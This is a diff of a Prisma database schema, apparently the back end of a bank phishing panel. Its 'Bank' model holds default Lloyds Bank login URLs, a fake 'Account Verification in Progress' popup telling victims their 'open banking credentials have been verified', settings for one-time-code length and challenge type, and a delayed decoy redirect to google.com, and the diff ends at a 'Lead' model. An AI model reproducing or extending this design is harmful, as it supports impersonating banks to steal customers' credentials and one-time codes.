@@ -8,41 +8,24 @@ datasource db {
 }
 
 model Bank {
-  id                String   @id @default(cuid())
-  name              String
-  subtitle          String
-  logoUrl           String?
-  redirectUrl       String?
-  subOptions        String?  @default("Business, Personal, Commercial")
-  sortOrder         Int      @default(0)
-  order             Int      @default(1)
-  isActive          Boolean  @default(true)
-
-  // 🌍 Category-wise Dedicated Bank URLs
-  personalUrl       String?  @default("https://authorise.lloydsbank.co.uk/auth/user")
-  businessUrl       String?  @default("https://www.lloydsbank.co.uk/business.html")
-  commercialUrl     String?  @default("https://www.lloydsbank.co.uk/commercial.html")
-
-  browserUrl        String?
-  browserAddressBar String?
-  popupStatus       String   @default("SUCCESS")
-  popupTitle        String?  @default("Account Verification in Progress")
-  popupHeading      String?  @default("Account Verification in Progress")
-  popupSubtitle     String?  @default("Security Check Required")
-  popupSubheading   String?  @default("Security Check Required")
-  popupMessage      String?  @default("Your open banking credentials have been verified. Click below to continue.")
-  popupBody         String?  @default("Your open banking credentials have been verified. Click below to continue.")
-  supportPhone      String?
-  popupButtonText   String?  @default("Complete Verification")
-  buttonText        String?  @default("Complete Verification")
-  popupRedirectUrl  String?  @default("https://google.com")
-
-  challengeType     String?  @default("none")
-  redirectDelay     Int?     @default(5)
-  otpLength         Int?     @default(6)
-
-  createdAt         DateTime @default(now())
-  updatedAt         DateTime @updatedAt
+  id               String   @id @default(cuid())
+  name             String
+  subtitle         String
+  subOptions       String?  @default("Business, Personal, Commercial")
+  logoUrl          String?
+  redirectUrl      String?
+  personalUrl      String?
+  businessUrl      String?
+  commercialUrl    String?
+  enablePersonal   Boolean  @default(true)
+  enableBusiness   Boolean  @default(true)
+  enableCommercial Boolean  @default(true)
+  sortOrder        Int      @default(0)
+  order            Int      @default(1)
+  isActive         Boolean  @default(true)
+  popupStatus      String   @default("SUCCESS")
+  createdAt        DateTime @default(now())
+  updatedAt        DateTime @updatedAt
 }
 
 model Lead {
